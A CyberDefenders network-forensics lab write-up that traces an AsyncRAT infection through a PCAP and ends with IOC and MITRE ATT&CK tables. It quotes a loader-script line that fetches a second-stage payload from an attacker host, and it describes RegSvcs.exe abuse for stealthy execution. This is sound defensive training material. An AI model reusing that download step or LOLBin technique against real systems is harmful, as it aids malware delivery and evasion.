# XLMRat Lab Write-Up: Network Traffic Analysis & Malware Investigation

## **Lab Overview**
- **Platform**: CyberDefenders
- **Lab Name**: XLMRat
- **Category**: Network Forensics
- **Tactics**: Execution, Defense Evasion
- **Tools Used**: Wireshark, CyberChef, VirusTotal, awk
- **Difficulty**: Easy
- **Scenario**: A compromised machine has been flagged due to suspicious network traffic. Your task is to analyze the PCAP file to determine the attack method, identify any malicious payloads, and trace the timeline of events. Focus on how the attacker gained access, what tools or techniques were used, and how the malware operated post‑compromise.
- **Lab Link**: https://cyberdefenders.org/blueteam-ctf-challenges/xlmrat/
---

## **Initial Triage**
Before diving into the questions, a quick look at **Statistics → Conversations** (IPv4 tab) reveals:
- Victim machine: `10.1.9.101`
- A public IP `45.126.209.4` with significant traffic volume – likely the attacker.

<img width="975" height="92" alt="image" src="https://github.com/user-attachments/assets/81da605c-1849-4392-857b-405e47d80521" />

> *Figure 1: IPv4 Conversations showing attacker IP 45.126.209.4 and victim 10.1.9.101.*

---

## **Investigation Steps & Answers**

### **Q1: URL of the First Malware Stage**
**Question:** The attacker successfully executed a command to download the first stage of the malware. What is the URL from which the first malware stage was installed?

#### **Method 1: Direct HTTP Stream Analysis (Simpler)**
- Apply a display filter for HTTP traffic: `http`.
- Observe two files downloaded:
  - `xlm.txt` (loader script)
  - `mdm.jpg` (malware executable disguised as an image)
- Locate the packet where `mdm.jpg` is requested. Right‑click and select **Follow → HTTP Stream**.
- The HTTP stream displays the full request URI:
  ```
  GET /mdm.jpg HTTP/1.1
  Host: 45.126.209.4:222
  ```
- Thus, the complete URL is: `http://45.126.209.4:222/mdm.jpg`.

<img width="975" height="151" alt="image" src="https://github.com/user-attachments/assets/047272a9-9623-4491-aec8-7945efb2db61" />

> *Figure 2: HTTP traffic showing the two file downloads.*

<img width="975" height="361" alt="image" src="https://github.com/user-attachments/assets/1fde3f90-155a-4f73-b12a-bef6f9863e20" />

> *Figure 3: HTTP stream of mdm.jpg revealing the URL.*

#### **Method 2: Extracting the URL from the Loader Script (In-Depth)**
- The loader script `xlm.txt` is downloaded first. Export it via **File → Export Objects → HTTP**.
- The script’s content is deliberately fragmented (spread across multiple packets) to hinder analysis. To reassemble it, use the following `awk` command in a Linux environment:
  ```bash
  awk -F'"' '/LZeWX\([0-9]+\)/ {printf "%s", $2} END {print ""}' xlm.txt
  ```
- This command extracts and concatenates all fragments, producing a readable script.
- Upon examination, the script contains a command that downloads the second stage:
  ```javascript
  var url = "http://45.126.209.4:222/mdm.jpg";
  ```
- Hence, the same URL is obtained.

<img width="975" height="473" alt="image" src="https://github.com/user-attachments/assets/ad7f465e-bfc8-439a-b231-23caf6e7724f" />
<img width="975" height="661" alt="image" src="https://github.com/user-attachments/assets/50db624f-4b87-4f8f-bedd-f3affd266b21" />

> *Figure 4: Fragmented loader script in Wireshark.*

<img width="975" height="65" alt="image" src="https://github.com/user-attachments/assets/c4d3b3c8-3e0d-4ade-8b9f-01bbe0dcd833" />

> *Figure 5: Reassembled script showing the download URL.*

**Answer:** `http://45.126.209.4:222/mdm.jpg`

---

### **Q2: Hosting Provider of the Attacker IP**
**Question:** Which hosting provider owns the associated IP address?

**Method:**
- Use a GeoIP / WHOIS lookup service (e.g., AbuseIPDB) for IP `45.126.209.4`.

**Finding:**
- The ISP / hosting provider is **ReliableSite.Net**.

<img width="975" height="470" alt="image" src="https://github.com/user-attachments/assets/3451e233-7dfa-4179-9ca3-42d0a67c53b5" />

> *Figure 6: AbuseIPDB lookup showing ReliableSite.Net.*

**Answer:** `ReliableSite.Net`

---

### **Q3: SHA256 of the Malware Executable**
**Question:** By analyzing the malicious scripts, two payloads were identified: a loader and a secondary executable. What is the SHA256 of the malware executable?

**Method:**
- Export the `mdm.jpg` file from Wireshark.
- Transfer it to a safe analysis environment (e.g., Kali Linux).
- Check its file type: it is actually text, not an image.
- View its contents – it contains hexadecimal data with dashes separating two sections.
- The first section (before the dash) is the malware executable encoded in hex.
- Use **CyberChef** to:
  1. Remove the dashes.
  2. Decode from hexadecimal.
  3. The output begins with `MZ` (DOS header), confirming it’s an executable.
- Compute the SHA256 hash of the decoded binary.

**Finding:**
- SHA256: `1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798`

<img width="975" height="407" alt="image" src="https://github.com/user-attachments/assets/a23f2a33-8661-4d76-a560-1db4f867b000" />
<img width="975" height="449" alt="image" src="https://github.com/user-attachments/assets/cf5ea3fc-85a4-480c-a698-0b40bc77134f" />

> *Figure 7: Exporting mdm.jpg from Wireshark.*

<img width="975" height="188" alt="image" src="https://github.com/user-attachments/assets/9732be81-c7f3-4f83-85ba-1e96cf11385f" />

<img width="975" height="307" alt="image" src="https://github.com/user-attachments/assets/7613af27-e4e7-423c-b8bb-b935f8274d26" />

> *Figure 8: File content showing hex with dashes.*

<img width="975" height="431" alt="image" src="https://github.com/user-attachments/assets/a154f7a5-02ca-4c1b-a8dd-eb29294bddb7" />

<img width="975" height="460" alt="image" src="https://github.com/user-attachments/assets/9e3ffe93-6bc8-412d-a57f-bb1744ee66f1" />

> *Figure 9: CyberChef removing dashes and decoding hex.*

<img width="975" height="433" alt="image" src="https://github.com/user-attachments/assets/fbe87ac1-14a5-4964-b602-3d5035253b40" />

> *Figure 10: SHA256 hash calculation.*

**Answer:** `1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798`

---

### **Q4: Malware Family Label (Alibaba)**
**Question:** What is the malware family label based on Alibaba?

**Method:**
- Submit the SHA256 hash to **VirusTotal**.
- Check the detection names, particularly those from Alibaba.

**Finding:**
- Alibaba detects the file as **`AsyncRAT`** (a known remote access trojan).

<img width="975" height="454" alt="image" src="https://github.com/user-attachments/assets/b776b022-eafe-478f-9bc3-0e345b5727eb" />

> *Figure 11: VirusTotal results showing AsyncRAT label.*

**Answer:** `asyncrat`

---

### **Q5: Malware Creation Timestamp**
**Question:** What is the timestamp of the malware's creation?

**Method:**
- In VirusTotal, view the **Details** tab for the file.
- Look for the “Creation Time” or “Compile Time” field in the PE header.

**Finding:**
- The timestamp is: **2023-10-30 15:08** (UTC).

<img width="975" height="466" alt="image" src="https://github.com/user-attachments/assets/4b95e91e-90ac-4849-9603-c0a68eb9d78d" />

> *Figure 12: VirusTotal details showing compilation timestamp.*

**Answer:** `2023-10-30 15:08`

---

### **Q6: LOLBin Used for Stealthy Execution**
**Question:** Which LOLBin is leveraged for stealthy process execution in this script? Provide the full path.

**Method:**
- Return to the reassembled loader script (from `xlm.txt`).
- Search for references to legitimate Windows binaries.
- The script contains a call to **RegSvcs.exe**, a .NET Framework tool that can be abused to execute code.

**Finding:**
- Full path: `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe`

<img width="975" height="452" alt="image" src="https://github.com/user-attachments/assets/062cc71d-da91-427d-9d64-d27102e3a639" />

<img width="975" height="430" alt="image" src="https://github.com/user-attachments/assets/a1c31dfa-28e5-487e-8fc2-549fdf1b7e66" />

<img width="975" height="487" alt="image" src="https://github.com/user-attachments/assets/5e1389e9-cbb9-4aed-aa57-cbcf351860fc" />

> *Figure 13: Script content revealing RegSvcs.exe invocation.*

**Answer:** `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe`

---

### **Q7: Files Dropped by the Script**
**Question:** The script is designed to drop several files. List the names of the files dropped by the script.

**Method:**
- Examine the reassembled script.
- Near the end, the script writes or creates additional files.

**Finding:**
- The dropped files are:
  - `Conted.ps1`
  - `Conted.bat`
  - `Conted.vbs`

<img width="958" height="1339" alt="image" src="https://github.com/user-attachments/assets/78062b38-3714-4861-8328-26d22ffa9f77" />

> *Figure 14: Script section showing file creation.*

**Answer:** `Conted.vbs, Conted.ps1, Conted.bat` (order may vary)

---
## **Finished**

<img width="679" height="1069" alt="image" src="https://github.com/user-attachments/assets/6fe4fb80-361c-4364-a6d2-194994134d69" />

## **Congrates**

<img width="975" height="469" alt="image" src="https://github.com/user-attachments/assets/f422dcbf-63b6-4980-845f-31f082ec0446" />


## **Indicators of Compromise (IOCs)**

| Type | Value |
|------|-------|
| Attacker IP | 45.126.209.4 |
| Attacker URL | http://45.126.209.4:222/mdm.jpg |
| Hosting Provider | ReliableSite.Net |
| Loader Script | xlm.txt |
| Malware Executable (SHA256) | 1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798 |
| Malware Family | AsyncRAT |
| Malware Compile Time | 2023-10-30 15:08 |
| LOLBin Path | C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe |
| Dropped Files | Conted.ps1, Conted.bat, Conted.vbs |

---

## **MITRE ATT&CK Mapping**

| Tactic | Technique | ID |
|--------|-----------|----|
| **Execution** | User Execution: Malicious File | T1204.002 |
| **Defense Evasion** | Masquerading: Match Legitimate Name or Location | T1036.005 |
| **Defense Evasion** | Signed Binary Proxy Execution: RegSvcs | T1218.009 |
| **Command and Control** | Application Layer Protocol: Web Protocols | T1071.001 |
| **Persistence** | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | T1547.001 (inferred) |

---

## **Conclusion**

The investigation of the XLMRat PCAP reveals a multi‑stage malware delivery:
1. The attacker’s IP `45.126.209.4` hosted a loader script (`xlm.txt`) and a malicious executable disguised as `mdm.jpg`.
2. The victim downloaded the loader, which then fetched and executed the second stage.
3. The loader used a LOLBin (`RegSvcs.exe`) to execute the payload stealthily.
4. The payload (AsyncRAT) was compiled on `2023-10-30 15:08` and dropped additional scripts (`Conted.ps1`, `.bat`, `.vbs`) for persistence or further actions.

These IOCs and techniques provide valuable indicators for threat hunting and emphasize the importance of monitoring anomalous HTTP traffic and LOLBin usage.

---

## **Tools Used**
- **Wireshark**: PCAP analysis, object export, stream following.
- **awk**: Reassembling fragmented script.
- **CyberChef**: Data manipulation (remove dashes, hex decode, hash calculation).
- **VirusTotal**: Malware identification and metadata extraction.

---

## **References**
- CyberDefenders.org – XLMRat Lab
- MITRE ATT&CK® Framework
- LOLBAS Project: RegSvcs.exe

---

*This write‑up documents a systematic forensic analysis of network traffic to uncover a malware infection chain, highlighting two distinct methods for extracting the initial download URL.*
